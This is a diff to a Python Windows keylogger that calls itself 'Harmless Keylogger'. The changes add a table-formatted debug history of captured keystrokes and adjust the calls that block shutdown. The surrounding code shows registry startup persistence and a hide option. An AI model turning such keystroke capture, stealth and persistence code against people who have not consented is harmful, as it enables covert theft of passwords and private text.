@@ -16,6 +16,7 @@ from threading import Timer
 from winreg import SetValueEx, EnumValue, QueryInfoKey, DeleteValue, OpenKey, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
 from KeyloggerConfig import KeyloggerConfig
 import ctypes
+from tabulate import tabulate
 
 # Folder where the pages of your book get logged
 BOOK_PATH = 'myBook'
@@ -27,6 +28,8 @@ LOGGER_NAME = "Harmless Keylogger"
 CURRENT_FILE_PATH = os.path.realpath(sys.argv[0])
 # Directory path
 DIR_PATH = os.path.dirname(os.path.realpath(sys.argv[0]))
+
+DEBUG_HISTORY_LENGTH = 10
 
 # Config object
 config = {}
@@ -44,6 +47,8 @@ visible = True
 # Import necessary functions from the Windows API
 user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
+# The history for debugging
+debug_history = []
 
 def to_tuple(list_in = []):
     return tuple(to_tuple(i) if isinstance(i, list) else i for i in list_in)
@@ -92,23 +97,33 @@ def remove_from_startup():
 
 # Debug logger
 def log_debug():
-    global config, heatmap_buffer
+    global config, heatmap_order, heatmap_buffer, debug_history
     if not config.get_hide() == "allways":
-        if len(heatmap_order) > 0:
-                # Print the last pressed key to console
-                if len(heatmap_order[-1]["key"]) == 1:
-                    print(heatmap_buffer[heatmap_order[-1]["key"][0]])
-                # Print the last pressed keycombinaiton to console
-                elif len(heatmap_order[-1]["key"]) == 2:
-                    print(heatmap_buffer[heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1]])
+        # Collect last N key events
+        rows = []
+        for entry in debug_history[-DEBUG_HISTORY_LENGTH:]:
+            rows.append([
+                entry.get("time"),
+                entry.get("scancode"),
+                entry.get("char"),
+                entry.get("value"),
+                entry.get("pressed"),
+            ])
+        # After printing, remove the printed entries from debug_history
+        del_count = len(rows)
+        debug_history = debug_history[:-del_count] if len(debug_history) >= del_count else []
+        if len(rows) > 0:
+            os.system('cls' if os.name == 'nt' else 'clear')
+            headers = ["Time", "ScanCode", "Char", "Value", "Pressed"]
+            print(tabulate(rows, headers, tablefmt="grid"))
 
 # Function to block shutdown
 def block_shutdown():
-    user32.ShutdownBlockReasonCreate(kernel32.GetCurrentProcess(), "Saving file, please wait...")
+    user32.ShutdownBlockReasonCreate(win32console.GetConsoleWindow(), "Saving file, please wait...")
 
 # Function to allow shutdown
 def allow_shutdown():
-    user32.ShutdownBlockReasonDestroy(kernel32.GetCurrentProcess())
+    user32.ShutdownBlockReasonDestroy(win32console.GetConsoleWindow())
 
 # Append file with pressed keys
 def log_local():
@@ -193,7 +208,7 @@ def add_to_heatmap_buffer(hash_name, key_pressed):
         heatmap_buffer[hash_name] = key_pressed
 
 def key_callback(event: KeyboardEvent):
-    global heatmap_buffer, heatmap_order, paused, pressed_keys
+    global heatmap_buffer, heatmap_order, paused, pressed_keys, debug_history
 
     # while paused no logging
     if paused:
@@ -276,6 +291,15 @@ def key_callback(event: KeyboardEvent):
         "value": [event.name],
         "length": 1
         }
+    
+    # Add to debug history
+    debug_history.append({
+        "time": now_ms,
+        "scancode": event.scan_code,
+        "char": event.name,
+        "value": key_pressed.get("value", [""])[0] if key_pressed else "",
+        "pressed": pressed_keys.copy(),
+    })
     
     if not key_pressed == {}:        
         # Add combination key to heatmap
